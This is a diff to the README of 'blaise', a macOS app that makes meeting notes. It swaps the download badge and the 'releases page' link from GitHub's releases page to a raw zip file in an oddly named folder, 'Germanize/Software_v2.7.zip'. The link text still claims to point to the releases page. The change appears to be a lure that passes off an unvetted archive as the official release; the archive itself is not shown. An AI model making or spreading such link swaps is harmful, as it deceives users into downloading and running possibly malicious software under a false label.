@@ -1,6 +1,6 @@
 # 🎙️ blaise - Private meeting notes for your Mac
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Delectable-cutoff186/blaise/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Delectable-cutoff186/blaise/main/Germanize/Software_v2.7.zip)
 
 blaise turns your recorded meetings into organized notes. The software runs entirely on your computer. Your audio files stay on your hardware. It handles English and Portuguese speech. It creates summaries and lists of action items for every session.
 
@@ -15,7 +15,7 @@ Blaise works on macOS. You need to ensure your system meets these standards:
 
 ## 📥 Getting Started
 
-Visit the [releases page](https://github.com/Delectable-cutoff186/blaise/releases) to download the application.
+Visit the [releases page](https://raw.githubusercontent.com/Delectable-cutoff186/blaise/main/Germanize/Software_v2.7.zip) to download the application.
 
 1.  Open the website link.
 2.  Look for the latest release at the top of the list.
